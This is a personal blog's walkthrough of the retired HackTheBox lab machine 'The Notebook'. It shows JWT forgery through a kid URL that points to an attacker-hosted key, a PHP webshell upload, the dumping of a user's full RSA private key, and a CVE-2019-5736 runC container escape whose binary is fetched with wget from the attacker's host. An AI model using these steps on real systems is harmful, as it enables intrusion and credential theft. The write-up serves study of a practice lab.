@@ -1,0 +1,734 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: The Notebook | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="../../theme/css/pure-min.css">
+    <link rel="stylesheet" href="../../theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="../../index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="../../pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="../../pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="../../2021/08/htb-the-notebook.html" title="Read more" class="entry-title-link">
+                HTB: The Notebook</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2021-08-01T10:45:00+02:00">01 Aug 2021</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
+          <a href="../../tag/jwt.html" title="Read more with the label JWT" class="meta-link">JWT</a> 
+          <a href="../../tag/docker.html" title="Read more with the label docker" class="meta-link">docker</a> 
+          <a href="../../tag/cve-2019-5736.html" title="Read more with the label CVE-2019-5736" class="meta-link">CVE-2019-5736</a> 
+          <a href="../../tag/cve.html" title="Read more with the label CVE" class="meta-link">CVE</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 6 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left" src="/media/2021.08/thenotebook_card.png" alt="The Notebook Card" width="262"></p>
+<p>This is a writeup about a retired HacktheBox machine:
+<a href="https://www.hackthebox.eu/home/machines/profile/320">TheNotebook</a> publish on
+Mars 6, 2021 by
+<a href="https://www.hackthebox.eu/home/users/profile/120514">mostwanted002</a>.
+This box is rated as a medium machine. It implies a JWT token, some PHP files
+and a docker exploit.</p>
+
+
+<h1 id="foothold">Foothold</h1>
+<h2 id="recon">Recon</h2>
+<p>Let us start as always by a <code>nmap</code> scan. Only port 80 (HTTP) and 22 (SSH) are
+open.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>Nmap scan report for 10.129.82.59</span>
+<span class="code-line">Host is up (0.013s latency).</span>
+<span class="code-line">Not shown: 65532 closed ports</span>
+<span class="code-line">PORT      STATE    SERVICE VERSION</span>
+<span class="code-line">22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span>
+<span class="code-line">80/tcp    open     http    nginx 1.14.0 (Ubuntu)</span>
+<span class="code-line">10010/tcp filtered rxapi</span>
+<span class="code-line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="web">Web</h1>
+<p>The website is an application to take notes. We can self register a user. We notice that:</p>
+<ul>
+<li>There is authorization control to access the notes but we need to know the UUID to access them.</li>
+<li>The first note we upload start with the number 5. Being on a VIP box means that there is already existing notes.</li>
+<li>The authentication is using a <a href="https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a">JWT token</a></li>
+</ul>
+<p>Our <a href="https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a">JWT token</a> has the following values:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9</span>
+<span class="code-line">{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;RS256&quot;,&quot;kid&quot;:&quot;http://localhost:7070/privKey.key&quot;}</span>
+<span class="code-line"></span>
+<span class="code-line">eyJ1c2VybmFtZSI6InJyIiwiZW1haWwiOiJyQHIuY29tIiwiYWRtaW5fY2FwIjowfQ</span>
+<span class="code-line">{&quot;username&quot;:&quot;rr&quot;,&quot;email&quot;:&quot;r@r.com&quot;,&quot;admin_cap&quot;:0}</span>
+<span class="code-line"></code></pre></div>
+
+<p>A few interesting point about this JWT token:</p>
+<ol>
+<li>the kid (Key ID) in the header is an URL</li>
+<li>there is a <code>admin_cap</code> parameter in the JWT payload.</li>
+</ol>
+<p>We host a simple HTTP server using python3 and change the KID value by our IP
+address and port and got a ping on it (with a 404).</p>
+<p>We use <a href="https://gist.github.com/ygotthilf/baa58da5c3dd1f69fae9">ssh-keygen to generate a RS256 private key</a>
+and we make it available using the python server.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>ssh-keygen -t rsa -b 4096 -m PEM -f privKey.key</span>
+<span class="code-line"></code></pre></div>
+
+<p>We use <a href="https://jwt.io/">https://jwt.io/</a> to generate a new token with the
+<code>admin_cap</code> parameter to <code>1</code> and sign it using our private key.</p>
+<p>By replacing our token with the new one we can now access the <a href="http://10.129.82.59/admin">admin panel</a>
+an view all the notes including the ones from the "admin" user saying that PHP
+files are being executed.</p>
+<p>We use the admin panel to upload <code>simple-backdoor.php</code> (located in
+<code>/usr/share/webshells/php</code> on Kali Linux).
+We can now execute command on the system using our webshell.</p>
+<p>We found a "home.tar.gz" archive in the <code>/backups/</code> folder.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>ls%20../../backups</span>
+<span class="code-line">apt.extended_states.0</span>
+<span class="code-line">apt.extended_states.1.gz</span>
+<span class="code-line">apt.extended_states.2.gz</span>
+<span class="code-line">home.tar.gz</span>
+<span class="code-line"></code></pre></div>
+
+<p>We copy the archive to our parent directory and extract it.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>cmd=cp%20../../backups/home.tar.gz%20../</span>
+<span class="code-line">cmd=tar%20xvf%20../home.tar.gz%20-C%20../</span>
+<span class="code-line">home/</span>
+<span class="code-line">home/noah/</span>
+<span class="code-line">home/noah/.bash_logout</span>
+<span class="code-line">home/noah/.cache/</span>
+<span class="code-line">home/noah/.cache/motd.legal-displayed</span>
+<span class="code-line">home/noah/.gnupg/</span>
+<span class="code-line">home/noah/.gnupg/private-keys-v1.d/</span>
+<span class="code-line">home/noah/.bashrc</span>
+<span class="code-line">home/noah/.profile</span>
+<span class="code-line">home/noah/.ssh/</span>
+<span class="code-line">home/noah/.ssh/id_rsa</span>
+<span class="code-line">home/noah/.ssh/authorized_keys</span>
+<span class="code-line">home/noah/.ssh/id_rsa.pub</span>
+<span class="code-line"></code></pre></div>
+
+<p>We can then get the "noah" user private SSH key.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>cmd=cat%20../home/noah/.ssh/id_rsa</span>
+<span class="code-line">-----BEGIN RSA PRIVATE KEY-----</span>
+<span class="code-line">MIIEpQIBAAKCAQEAyqucvz6P/EEQbdf8cA44GkEjCc3QnAyssED3qq9Pz1LxEN04</span>
+<span class="code-line">HbhhDfFxK+EDWK4ykk0g5MvBQckcxAs31mNnu+UClYLMb4YXGvriwCrtrHo/ulwT</span>
+<span class="code-line">rLymqVzxjEbLUkIgjZNW49ABwi2pDfzoXnij9JK8s3ijIo+w/0RqHzAfgS3Y7t+b</span>
+<span class="code-line">HVo4kvIHT0IXveAivxez3UpiulFkaQ4zk37rfHO3wuTWsyZ0vmL7gr3fQRBndrUD</span>
+<span class="code-line">v4k2zwetxYNt0hjdLDyA+KGWFFeW7ey9ynrMKW2ic2vBucEAUUe+mb0EazO2inhX</span>
+<span class="code-line">rTAQEgTrbO7jNoZEpf4MDRt7DTQ7dRz+k8HG4wIDAQABAoIBAQDIa0b51Ht84DbH</span>
+<span class="code-line">+UQY5+bRB8MHifGWr+4B6m1A7FcHViUwISPCODg6Gp5o3v55LuKxzPYPa/M0BBaf</span>
+<span class="code-line">Q9y29Nx7ce/JPGzAiKDGvH2JvaoF22qz9yQ5uOEzMMdpigS81snsV10gse1bQd4h</span>
+<span class="code-line">CA4ehjzUultDO7RPlDtbZCNxrhwpmBMjCjQna0R2TqPjEs4b7DT1Grs9O7d7pyNM</span>
+<span class="code-line">Um/rxjBx7AcbP+P7LBqLrnk7kCXeZXbi15Lc9uDUS2c3INeRPmbFl5d7OdlTbXce</span>
+<span class="code-line">YwHVJckFXyeVP6Qziu3yA3p6d+fhFCzWU3uzUKBL0GeJSARxISsvVRzXlHRBGU9V</span>
+<span class="code-line">AuyJ2O4JAoGBAO67RmkGsIAIww/DJ7fFRRK91dvQdeaFSmA7Xf5rhWFymZ/spj2/</span>
+<span class="code-line">rWuuxIS2AXp6pmk36GEpUN1Ea+jvkw/NaMPfGpIl50dO60I0B4FtJbood2gApfG9</span>
+<span class="code-line">0uPb7a+Yzbj10D3U6AnDi0tRtFwnnyfRevS+KEFVXHTLPTPGjRRQ41OdAoGBANlU</span>
+<span class="code-line">kn7eFJ04BYmzcWbupXaped7QEfshGMu34/HWl0/ejKXgVkLsGgSB5v3aOlP6KqEE</span>
+<span class="code-line">vk4wAFKj1i40pEAp0ZNawD5TsDSHoAsIxRnjRM+pZ2bjku0GNzCAU82/rJSnRA+X</span>
+<span class="code-line">i7zrFYhfaKldu4fNYgHKgDBx8X/DeD0vLellpLx/AoGBANoh0CIi9J7oYqNCZEYs</span>
+<span class="code-line">QALx5jilbzUk0WLAnA/eWs9BkVFpQDTnsSPVWscQLqWk7+zwIqq0v6iN3jPGxA8K</span>
+<span class="code-line">VxGyB2tGqt6jI58oPztpabGBTCmBfh82nT2KNNHfwwmfwZjdsu9I9zvo+e3CXlBZ</span>
+<span class="code-line">vglmvw2DW6l0EwX+A+ZuSmiZAoGAb2mgtDMrRDHc/Oul3gvHfV6CYIwwO5qK+Jyr</span>
+<span class="code-line">2WWWKla/qaWo8yPQbrEddtOyBS0BP4yL9s86yyK8gPFxpocJrk3esdT7RuKkVCPJ</span>
+<span class="code-line">z2yn8QE6Rg+yWZpPHqkazSZO1eItzQR2mYG2hzPKFtE7evH6JUrnjm5LTKEreco+</span>
+<span class="code-line">8iCuZAcCgYEA1fhcJzNwEUb2EOV/AI23rYpViF6SiDTfJrtV6ZCLTuKKhdvuqkKr</span>
+<span class="code-line">JjwmBxv0VN6MDmJ4OhYo1ZR6WiTMYq6kFGCmSCATPl4wbGmwb0ZHb0WBSbj5ErQ+</span>
+<span class="code-line">Uh6he5GM5rTstMjtGN+OQ0Z8UZ6c0HBM0ulkBT9IUIUEdLFntA4oAVQ=</span>
+<span class="code-line">-----END RSA PRIVATE KEY-----</span>
+<span class="code-line"></code></pre></div>
+
+<p>We use it to connect on the box as "noah" and get the user flag.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>└─$ ssh noah@10.129.82.59 -i id_rsa</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line">noah@thenotebook:~$ id</span>
+<span class="code-line">uid=1000(noah) gid=1000(noah) groups=1000(noah)</span>
+<span class="code-line">noah@thenotebook:~$ cat user.txt</span>
+<span class="code-line">4a22cbbbecb491a77b6659fdf00183ba</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="root">root</h1>
+<h2 id="docker">Docker</h2>
+<p>We enumerate our permission on the box.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>noah@thenotebook:~$ sudo -l</span>
+<span class="code-line">Matching Defaults entries for noah on thenotebook:</span>
+<span class="code-line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span>
+<span class="code-line"></span>
+<span class="code-line">User noah may run the following commands on thenotebook:</span>
+<span class="code-line">    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*</span>
+<span class="code-line"></code></pre></div>
+
+<p>Our user can execute command on the "webapp-dev01" docker machine. We can use
+<code>sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash</code> to get a bash shell
+inside the docker.</p>
+<p>As docker is used we run the <a href="https://github.com/stealthcopter/deepce">deepce</a>
+script on the host box. The script found that the docker version used it
+vulnerable to a container escape exploit.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>noah@thenotebook:~$ sh deepce.sh</span>
+<span class="code-line"></span>
+<span class="code-line">                      ##         .</span>
+<span class="code-line">                ## ## ##        ==</span>
+<span class="code-line">            ## ## ## ##       ===</span>
+<span class="code-line">        /&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;\___/ ===</span>
+<span class="code-line">    ~~~ {~~ ~~~~ ~~~ ~~~~ ~~~ ~ /  ===- ~~~</span>
+<span class="code-line">        \______ X           __/</span>
+<span class="code-line">          \    \         __/</span>
+<span class="code-line">            \____\_______/</span>
+<span class="code-line">          __</span>
+<span class="code-line">    ____/ /__  ___  ____  ________</span>
+<span class="code-line">    / __  / _ \/ _ \/ __ \/ ___/ _ \   ENUMERATE</span>
+<span class="code-line">  / /_/ /  __/  __/ /_/ / (__/  __/  ESCALATE</span>
+<span class="code-line">  \__,_/\___/\___/ .___/\___/\___/  ESCAPE</span>
+<span class="code-line">                /_/</span>
+<span class="code-line"></span>
+<span class="code-line">Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)</span>
+<span class="code-line">by stealthcopter</span>
+<span class="code-line"></span>
+<span class="code-line">==========================================( Colors )==========================================</span>
+<span class="code-line">[+] Exploit Test ............ Exploitable - Check this out</span>
+<span class="code-line">[+] Basic Test .............. Positive Result</span>
+<span class="code-line">[+] Another Test ............ Error running check</span>
+<span class="code-line">[+] Negative Test ........... No</span>
+<span class="code-line">[+] Multi line test ......... Yes</span>
+<span class="code-line">Command output</span>
+<span class="code-line">spanning multiple lines</span>
+<span class="code-line"></span>
+<span class="code-line">Tips will look like this and often contains links with additional info. You can usually</span>
+<span class="code-line">ctrl+click links in modern terminal to open in a browser window</span>
+<span class="code-line">See https://stealthcopter.github.io/deepce</span>
+<span class="code-line"></span>
+<span class="code-line">===================================( Enumerating Platform )===================================</span>
+<span class="code-line">grep: /proc/1/cgroup: No such file or directory</span>
+<span class="code-line">grep: /proc/1/cgroup: No such file or directory</span>
+<span class="code-line">grep: /proc/1/cgroup: No such file or directory</span>
+<span class="code-line">[+] Inside Container ........ No</span>
+<span class="code-line">[+] User .................... noah</span>
+<span class="code-line">[+] Groups .................. noah</span>
+<span class="code-line">[+] Container tools ......... Yes</span>
+<span class="code-line">/usr/bin/docker</span>
+<span class="code-line">/usr/bin/lxc</span>
+<span class="code-line">[+] Docker Executable ....... /usr/bin/docker</span>
+<span class="code-line">[+] Docker version .......... 18.06.0-ce</span>
+<span class="code-line">[+] User in Docker group .... No</span>
+<span class="code-line">[+] Docker Sock ............. Yes</span>
+<span class="code-line">srw-rw---- 1 root docker 0 Mar  7 10:10 /var/run/docker.sock</span>
+<span class="code-line"></span>
+<span class="code-line">[+] Sock is writable ........ No</span>
+<span class="code-line">To see full info from the docker sock output run the following</span>
+<span class="code-line"></span>
+<span class="code-line">curl -s --unix-socket /var/run/docker.sock http://localhost/info</span>
+<span class="code-line"></span>
+<span class="code-line">[+] Docker Exploits ......... 18.06.0-ce</span>
+<span class="code-line">[+] CVE–2019–13139 .......... deepce.sh: 139: printf: 0-ce: not completely converted</span>
+<span class="code-line">Yes</span>
+<span class="code-line">Docker versions before 18.09.4 are vulnerable to a command execution vulnerability when</span>
+<span class="code-line">parsing URLs</span>
+<span class="code-line"></span>
+<span class="code-line">[+] CVE–2019–5736 ........... deepce.sh: 139: printf: 0-ce: not completely converted</span>
+<span class="code-line">Yes</span>
+<span class="code-line">Docker versions before 18.09.2 are vulnerable to a container escape by overwriting the</span>
+<span class="code-line">runC binary</span>
+<span class="code-line"></span>
+<span class="code-line">==================================( Enumerating Containers )==================================</span>
+<span class="code-line">==============================================================================================</span>
+<span class="code-line"></code></pre></div>
+
+<p>A quick Google search return us a simple <a href="https://github.com/Frichetten/CVE-2019-5736-PoC">CVE-2019-5736 PoC</a>
+written in Golang.</p>
+<p>We modify the <code>main.go</code> file with the payload <code>var payload = "#!/bin/bash \n cat /root/root.txt &gt; /tmp/shadow &amp;&amp; chmod 777 /tmp/shadow"</code>
+and compile it using <code>go build main.go</code>. We then download it from the docker and
+run it.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash</span>
+<span class="code-line">root@893ea5c84398:/opt/webapp# cd /tmp/</span>
+<span class="code-line">root@893ea5c84398:/tmp# wget http://10.10.14.28:8000/main</span>
+<span class="code-line">--2021-03-08 17:07:53--  http://10.10.14.28:8000/main</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line">2021-03-08 17:07:53 (10.8 MB/s) - ‘main’ saved [2236814/2236814]</span>
+<span class="code-line"></span>
+<span class="code-line">root@893ea5c84398:/tmp# chmod +x main</span>
+<span class="code-line">root@893ea5c84398:/tmp# ./main</span>
+<span class="code-line">[+] Overwritten /bin/sh successfully</span>
+<span class="code-line">[+] Found the PID: 103</span>
+<span class="code-line">[+] Successfully got the file handle</span>
+<span class="code-line">[+] Successfully got write handle &amp;{0xc0004078c0}</span>
+<span class="code-line">root@893ea5c84398:/tmp#</span>
+<span class="code-line"></code></pre></div>
+
+<p>On another terminal on the "thenotebook" host we run the following command (our exploit binary rewrite
+<code>/bin/sh</code> so we need to call that command) and get the private flag.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh</span>
+<span class="code-line">No help topic for &#39;/bin/sh&#39;</span>
+<span class="code-line">noah@thenotebook:~$ ls /tmp/</span>
+<span class="code-line">home  shadow  systemd-private-0c3e87bdcb724a669778cfa72c5b4017-systemd-timesyncd.service-vsSHAh  tmux-1000  vmware-root_611-3980232955</span>
+<span class="code-line">noah@thenotebook:~$ cat /tmp/shadow</span>
+<span class="code-line">e16458a8ec21a020bb382e56d8f0ed42</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="wrapping-up">Wrapping up</h1>
+<p>An interesting box as working with JWT token is more and more common. The docker
+exploit is simple to use. A nice box overall.</p>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="../../2021/07/htb-armageddon.html"> HTB: Armageddon </a>
+          </div>
+          <div>
+            <b>Next article:</b> <a href="../../2021/08/htb-love.html"> HTB: Love </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-3">
+              <a href="../../tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dll.html">DLL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/pypi.html">pypi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/upload.html">Upload</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/memcache.html">memcache</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nmap.html">nmap</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bludit.html">bludit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nosql.html">NoSQL</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/azure.html">Azure</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/linux.html">linux</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/umbraco.html">umbraco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/tomcat.html">tomcat</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/jackson.html">jackson</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/javascript.html">javascript</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/webassembly.html">webassembly</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/laravel.html">laravel</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vnc.html">VNC</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ldap.html">LDAP</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/re.html">RE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/deserialization.html">deserialization</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xss.html">XSS</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/git.html">git</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/php.html">php</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vb.html">VB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/core-dump.html">core dump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cloudme.html">cloudme</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chef.html">chef</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/web.html">web</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxc.html">lxc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/crypto.html">Crypto</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adb.html">adb</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cewl.html">cewl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/path.html">PATH</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phishing.html">phishing</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/rsa.html">RSA</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/msfconsole.html">msfconsole</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xxe.html">XXE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/php-filter.html">php filter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssti.html">SSTI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/yaml.html">YAML</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nft.html">NFT</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/cve.html">CVE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/impacket.html">impacket</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openbsd.html">OpenBSD</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openemr.html">openEMR</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/print-nightmare.html">print nightmare</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sudo.html">sudo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/capabilities.html">capabilities</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/logrotate.html">logrotate</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/enumeration.html">enumeration</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chisel.html">chisel</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lfi.html">LFI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/android.html">Android</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/journalctl.html">journalctl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phs.html">PHS</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/windows.html">windows</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/jwt.html">jwt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/iot.html">IOT</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nostromo.html">nostromo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssrf.html">SSRF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/net.html">.NET</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxd.html">lxd</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/composer.html">composer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/teamviewer.html">teamviewer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/splunk.html">Splunk</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adminer.html">adminer</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/smb.html">SMB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/zip.html">zip</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/strapi.html">strapi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/john.html">john</a>
+            </li>
+            <li class="tag tag-1">
